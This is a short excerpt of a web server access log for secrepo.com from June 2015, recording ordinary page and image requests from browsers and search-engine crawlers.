98.224.3.67 - - [22/Jun/2015:12:34:25 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
98.224.3.67 - - [22/Jun/2015:12:34:25 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
98.224.3.67 - - [22/Jun/2015:12:34:25 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3" 
180.76.15.22 - - [22/Jun/2015:12:44:12 -0700] "GET / HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
180.76.15.161 - - [22/Jun/2015:12:44:55 -0700] "GET / HTTP/1.1" 200 21900 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" 
66.249.81.170 - - [22/Jun/2015:12:49:51 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
66.249.81.170 - - [22/Jun/2015:12:49:51 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "-" "Mozilla/5.0 (Windows NT 6.1; rv:6.0) Gecko/20110814 Firefox/6.0 Google favicon" 
146.6.208.16 - - [22/Jun/2015:12:56:24 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36" 
146.6.208.16 - - [22/Jun/2015:12:56:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36" 
146.6.208.16 - - [22/Jun/2015:12:56:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36" 
146.6.208.16 - - [22/Jun/2015:12:56:24 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36" 
37.46.163.47 - - [22/Jun/2015:13:22:49 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" 
37.46.163.47 - - [22/Jun/2015:13:22:49 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7427 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" 
37.46.163.47 - - [22/Jun/2015:13:22:50 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36" 
50.19.181.155 - - [22/Jun/2015:13:23:16 -0700] "GET / HTTP/1.1" 200 7043 "-" "Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) PhantomJS/1.9.8 Safari/534.34" 
50.19.181.155 - - [22/Jun/2015:13:23:16 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "-" "-" 
50.19.181.155 - - [22/Jun/2015:13:23:16 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "-" "-" 
188.165.15.29 - - [22/Jun/2015:13:27:07 -0700] "GET /self.logs/error.log.2015-06-04.gz HTTP/1.1" 200 912 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.0; +http://ahrefs.com/robot/)" 
207.46.13.50 - - [22/Jun/2015:13:30:42 -0700] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 3730 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.173 - - [22/Jun/2015:13:31:06 -0700] "GET /self.logs/?C=M;O=D HTTP/1.1" 200 3765 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
173.67.197.178 - - [22/Jun/2015:13:35:53 -0700] "GET / HTTP/1.1" 200 7043 "http://www2.mlsecproject.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36" 
